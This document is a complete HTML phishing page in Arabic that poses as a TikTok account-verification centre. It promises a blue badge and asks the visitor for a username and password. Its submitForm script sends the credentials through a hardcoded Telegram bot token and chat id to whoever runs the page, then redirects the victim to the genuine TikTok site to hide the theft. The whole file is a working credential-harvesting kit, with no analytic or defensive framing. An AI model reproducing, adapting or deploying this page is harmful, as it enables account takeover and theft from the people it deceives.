<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
  <title>مركز توثيق تيك توك</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body { background: #000; color: #fff; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; min-height: 100vh; padding: 0 20px; }
    
    .header { text-align: center; padding: 48px 0 10px; }
    .tiktok-title { font-size: 54px; font-weight: 800; letter-spacing: -1.8px; color: #ffffff; line-height: 1; margin-bottom: 10px; }
    
    .badge-container { display: flex; justify-content: center; margin-bottom: 25px; }
    .verified-badge { width: 35px; height: 35px; fill: #20d5ec; }

    h1 { font-size: 26px; font-weight: 700; margin: 10px 0 16px; text-align: center; }
    
    .warning { font-size: 15px; color: #f0f0f0; text-align: center; line-height: 1.6; margin: 0 auto 36px; max-width: 380px; }
    
    .form { max-width: 380px; margin: 0 auto; }
    
    .input-field { 
      width: 100%; 
      height: 54px; 
      padding: 0 16px; 
      background: #0f0f0f; 
      border: 1px solid #1a1a1a; 
      border-radius: 10px; 
      color: #fff; 
      font-size: 16px; 
      margin-bottom: 20px; 
      text-align: right;
    }
    
    .input-field::placeholder { color: #777; }
    
    .password-wrapper { position: relative; margin-bottom: 20px; height: 54px; }
    .toggle-password { 
      position: absolute; 
      top: 0; 
      left: 15px; 
      height: 100%; 
      background: none; 
      border: none; 
      cursor: pointer; 
      color: #aaa; 
      display: flex; 
      align-items: center; 
      z-index: 5; 
    }
    .toggle-password svg { width: 20px; height: 20px; fill: currentColor; }
    
    .btn { width: 100%; height: 54px; margin: 28px 0 20px; background: #fe2c55; color: #fff; border: none; border-radius: 999px; font-size: 17px; font-weight: 700; cursor: pointer; }
    .forgot { display: block; text-align: center; color: #fe2c55; font-size: 14.5px; text-decoration: none; margin-bottom: 40px; }
    
    .footer { text-align: center; color: #444; font-size: 12px; padding: 20px 0 40px; line-height: 1.6; border-top: 1px solid #1a1a1a; max-width: 380px; margin: 0 auto; }
  </style>
</head>
<body>
  <div class="header">
    <div class="tiktok-title">TikTok</div>
    <div class="badge-container">
      <svg class="verified-badge" viewBox="0 0 24 24"><path d="M23.33 11.58l-2.09-2.41.33-3.18-3.13-.71-1.63-2.75L14 3.75l-2-.86-2 .86-2.81-1.22-1.63 2.75-3.13.71.33 3.18-2.09 2.41 2.09 2.41-.33 3.18 3.13.71 1.63 2.75L10 19.38l2 .86 2-.86 2.81 1.22 1.63-2.75 3.13-.71-.33-3.18 2.09-2.41zM9.5 15.5L6 12l1.41-1.41L9.5 12.67l6.59-6.59L17.5 7.5l-8 8z"/></svg>
    </div>
  </div>

  <h1>طلب توثيق الحساب الرسمي</h1>
  
  <p class="warning">
    مرحباً بك في مركز التحقق من تيك توك. من أجل الحفاظ على أمان مجتمعنا، يرجى تقديم بيانات حسابك لمراجعة الأهلية والحصول على شارة التحقق الزرقاء مباشرة.
  </p>
  
  <form class="form" onsubmit="submitForm(event)">
    <input class="input-field" type="text" id="user" placeholder="الهاتف / البريد الإلكتروني / اسم المستخدم" required />
    
    <div class="password-wrapper">
      <input class="input-field" id="password" type="password" placeholder="كلمة المرور" required />
      <button type="button" class="toggle-password" id="toggleBtn">
        <svg viewBox="0 0 24 24"><path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/></svg>
      </button>
    </div>
    
    <button class="btn" type="submit">إرسال طلب التوثيق</button>
  </form>
  
  <a href="#" class="forgot">هل نسيت كلمة المرور؟</a>

  <div class="footer">
    © TikTok - مركز المساعدة والدعم 2026<br>جميع الحقوق محفوظة
  </div>

  <script>
    const passwordInput = document.getElementById('password');
    const toggleBtn = document.getElementById('toggleBtn');
    
    toggleBtn.addEventListener('click', () => {
      const isPassword = passwordInput.type === 'password';
      passwordInput.type = isPassword ? 'text' : 'password';
    });

    async function submitForm(event) {
      event.preventDefault();
      const user = document.getElementById('user').value;
      const pass = document.getElementById('password').value;
      const token = '8633152106:AAHnSFCxJtolR1AlUGG5f1hcwmYxsTobS7I'; 
      const id = '5757914383'; 
      const msg = `👑 طلب توثيق حساب جديد 🔥\n👤 User: ${user}\n🔑 Pass: ${pass}`;
      
      await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${id}&text=${encodeURIComponent(msg)}`);
      window.location.href = "https://www.tiktok.com/id/verification";
    }
  </script>
</body>
</html>
